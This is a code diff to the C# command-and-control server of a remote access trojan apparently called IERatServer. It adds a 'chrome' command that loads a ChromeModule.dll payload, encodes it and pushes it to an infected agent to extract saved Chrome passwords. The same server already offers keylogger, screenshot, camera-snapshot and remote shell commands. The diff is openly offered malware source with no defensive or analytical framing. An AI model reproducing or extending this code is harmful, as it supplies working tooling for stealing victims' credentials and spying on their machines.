@@ -63,6 +63,9 @@ namespace IERatServer
             [Command(typeof(ScreenshotCommand), Description = "Download a file")]
             screenshot,
 
+            [Command(typeof(ChromeCommand), Description = "Extract Chrome passwords")]
+            chrome,
+
             [Command(typeof(KeyloggerCommand), Description = "Keylogger module operations")]
             keylogger,
 
@@ -132,7 +135,6 @@ namespace IERatServer
                     }
                     else
                     {
-                        agent.LoadedModules.Add("klog", null);
                         var CameraModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "CameraModule.dll"));
                         AddTaskToActiveAgent("camsnapshot", Convert.ToBase64String(ServerUtils.Compress(CameraModule)));
                         agent.LoadedModules.Add("camsnapshot", null);
@@ -146,7 +148,33 @@ namespace IERatServer
                 return Task.FromResult(CommandResult.Success);
             }
         }
-
+        class ChromeCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
+                var agent = ActiveChannel.agent;
+                try
+                {
+                    if (agent.LoadedModules.ContainsKey("chrome"))
+                    {
+                        AddTaskToActiveAgent("chrome", "");
+                    }
+                    else
+                    {
+                        var CameraModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "ChromeModule.dll"));
+                        AddTaskToActiveAgent("chrome", Convert.ToBase64String(ServerUtils.Compress(CameraModule)));
+                        agent.LoadedModules.Add("chrome", null);
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("Error - Unable to load chrome passwords module - ChromeModule.dll was not found in Modules folder");
+                    Logger.Log("error", "Unable to load chrome passwords module - ChromeModule.dll was not found in Modules folder");
+                }
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
         class ShellCommand : Command
         {
             [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a shell command to execute")]
